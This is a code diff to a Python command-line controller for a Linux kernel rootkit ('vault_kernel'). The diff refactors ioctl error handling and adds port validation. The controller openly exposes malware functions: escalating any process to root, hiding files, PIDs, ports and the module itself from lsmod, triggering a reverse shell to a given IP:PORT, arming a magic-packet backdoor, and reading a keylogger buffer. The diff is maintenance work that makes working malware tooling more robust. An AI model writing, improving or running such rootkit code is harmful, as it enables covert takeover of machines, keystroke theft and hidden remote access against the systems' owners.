@@ -29,10 +29,23 @@ import os
 import sys
 import struct
 import fcntl
+import errno
 import argparse
 
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
+
+
+def _port_arg(value):
+    """argparse type: TCP/UDP port in the 1-65535 range."""
+    try:
+        iv = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(f"invalid port: {value!r}")
+    if not 1 <= iv <= 65535:
+        raise argparse.ArgumentTypeError(
+            f"port must be in 1-65535, got {iv}")
+    return iv
 
 # Standard Linux ioctl layout (uapi/asm-generic/ioctl.h):
 #   bits 31:30 = direction  (0=none, 1=write, 2=read)
@@ -93,7 +106,29 @@ class VaultKernelClient:
     def _open(self):
         if self.fd is not None:
             return
-        self.fd = os.open(DEVICE_PATH, os.O_RDWR)
+        if not os.path.exists(DEVICE_PATH):
+            raise SystemExit(
+                f"[-] {DEVICE_PATH} not found — is the module loaded?\n"
+                "    Run: sudo insmod vault_kernel.ko")
+        try:
+            self.fd = os.open(DEVICE_PATH, os.O_RDWR)
+        except PermissionError:
+            raise SystemExit(
+                f"[-] Permission denied on {DEVICE_PATH}. Run with sudo.")
+
+    def _ioctl(self, request, buf=None):
+        """Run an ioctl and report failures cleanly instead of
+        crashing with a raw traceback (v3.2 only mapped EPERM)."""
+        try:
+            fcntl.ioctl(self.fd, request, buf)
+            return True
+        except OSError as e:
+            print(f"[-] ioctl failed: {e}")
+            if e.errno in (errno.EPERM, errno.EACCES):
+                print("    Run with sudo.")
+            elif e.errno == errno.ENOTTY:
+                print("    Module and CLI version mismatch (ioctl number).")
+            return False
 
     def _close(self):
         if self.fd is not None:
@@ -104,156 +139,111 @@ class VaultKernelClient:
         """Escalate a process to root. pid=0 means current process."""
         self._open()
         pid_buf = struct.pack("i", pid)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_GIVE_ROOT, pid_buf)
+        if self._ioctl(IOCTL_GIVE_ROOT, pid_buf):
             print(f"[+] Granted root to PID {pid if pid else os.getpid()}")
-        except PermissionError:
-            print("[-] Permission denied. Run as root.")
         self._close()
 
     def hide_file(self, name):
         self._open()
         buf = name.encode().ljust(256, b'\x00')
-        try:
-            fcntl.ioctl(self.fd, IOCTL_HIDE_FILE, buf)
+        if self._ioctl(IOCTL_HIDE_FILE, buf):
             print(f"[+] Hiding file/dir: {name}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def unhide_file(self, name):
         self._open()
         buf = name.encode().ljust(256, b'\x00')
-        try:
-            fcntl.ioctl(self.fd, IOCTL_UNHIDE_FILE, buf)
+        if self._ioctl(IOCTL_UNHIDE_FILE, buf):
             print(f"[-] Revealed: {name}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def hide_pid(self, pid):
         self._open()
         pid_buf = struct.pack("i", pid)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_HIDE_PID, pid_buf)
+        if self._ioctl(IOCTL_HIDE_PID, pid_buf):
             print(f"[+] Hiding PID: {pid}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def unhide_pid(self, pid):
         self._open()
         pid_buf = struct.pack("i", pid)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_UNHIDE_PID, pid_buf)
+        if self._ioctl(IOCTL_UNHIDE_PID, pid_buf):
             print(f"[-] Revealed PID: {pid}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def hide_port(self, port):
         self._open()
         port_buf = struct.pack("H", port)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_HIDE_PORT, port_buf)
+        if self._ioctl(IOCTL_HIDE_PORT, port_buf):
             print(f"[+] Hiding port: {port}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def unhide_port(self, port):
         self._open()
         port_buf = struct.pack("H", port)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_UNHIDE_PORT, port_buf)
+        if self._ioctl(IOCTL_UNHIDE_PORT, port_buf):
             print(f"[-] Revealed port: {port}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def list_hidden(self):
         self._open()
         buf = bytearray(4096)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_LIST_HIDDEN, buf)
+        if self._ioctl(IOCTL_LIST_HIDDEN, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
             print(output if output else "(nothing hidden)")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def shell(self, target):
         """Trigger reverse shell to IP:PORT."""
         self._open()
         buf = target.encode().ljust(256, b'\x00')
-        try:
-            fcntl.ioctl(self.fd, IOCTL_BACKDOOR_SHELL, buf)
+        if self._ioctl(IOCTL_BACKDOOR_SHELL, buf):
             print(f"[+] Reverse shell triggered — connecting to {target}")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def set_magic(self, word):
         """Set magic packet trigger word for kill() backdoor."""
         self._open()
         buf = word.encode().ljust(16, b'\x00')
-        try:
-            fcntl.ioctl(self.fd, IOCTL_BACKDOOR_MAGIC, buf)
+        if self._ioctl(IOCTL_BACKDOOR_MAGIC, buf):
             print(f"[+] Magic packet backdoor enabled: '{word}'")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def keylog_read(self):
         """Read captured keystrokes."""
         self._open()
         buf = bytearray(4096)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_KEYLOG_READ, buf)
+        if self._ioctl(IOCTL_KEYLOG_READ, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
             print(f"[*] Keystroke log:\n{output}" if output else "[*] (no keystrokes captured)")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def keylog_clear(self):
         """Clear keylogger buffer."""
         self._open()
-        try:
-            fcntl.ioctl(self.fd, IOCTL_KEYLOG_CLEAR)
+        if self._ioctl(IOCTL_KEYLOG_CLEAR):
             print("[+] Keylogger buffer cleared")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def hide_module(self):
         """Hide the rootkit from lsmod."""
         self._open()
-        try:
-            fcntl.ioctl(self.fd, IOCTL_MODULE_HIDE)
+        if self._ioctl(IOCTL_MODULE_HIDE):
             print("[+] Module hidden from lsmod")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def unhide_module(self):
         """Make the rootkit visible in lsmod."""
         self._open()
-        try:
-            fcntl.ioctl(self.fd, IOCTL_MODULE_UNHIDE)
+        if self._ioctl(IOCTL_MODULE_UNHIDE):
             print("[-] Module visible again in lsmod")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def reset(self):
         """Clear every hidden file, PID and port in one shot."""
         self._open()
-        try:
-            fcntl.ioctl(self.fd, IOCTL_RESET_ALL)
+        if self._ioctl(IOCTL_RESET_ALL):
             print("[+] Reset: all hidden files, PIDs and ports cleared")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def status(self):
@@ -280,12 +270,9 @@ class VaultKernelClient:
         """Read module statistics via IOCTL_GET_STATS."""
         self._open()
         buf = bytearray(4096)
-        try:
-            fcntl.ioctl(self.fd, IOCTL_GET_STATS, buf)
+        if self._ioctl(IOCTL_GET_STATS, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
             print(output if output else "(no stats returned)")
-        except PermissionError:
-            print("[-] Permission denied. Run with sudo.")
         self._close()
 
     def magic_encode(self, word, port):
@@ -324,10 +311,10 @@ def main():
     sp.add_argument("pid", type=int, help="Process ID")
 
     sp = subparsers.add_parser("hide-port", help="Hide a TCP/UDP port")
-    sp.add_argument("port", type=int, help="Port number")
+    sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")
 
     sp = subparsers.add_parser("unhide-port", help="Reveal a hidden port")
-    sp.add_argument("port", type=int, help="Port number")
+    sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")
 
     subparsers.add_parser("list", help="List all hidden items")
     subparsers.add_parser("stats", help="Show module stats")
@@ -340,7 +327,7 @@ def main():
 
     sp = subparsers.add_parser("magic-encode", help="Print the kill() trigger for word+port")
     sp.add_argument("word", help="Trigger word")
-    sp.add_argument("port", type=int, help="Callback port")
+    sp.add_argument("port", type=_port_arg, help="Callback port (1-65535)")
 
     subparsers.add_parser("keylog", help="Read captured keystrokes")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
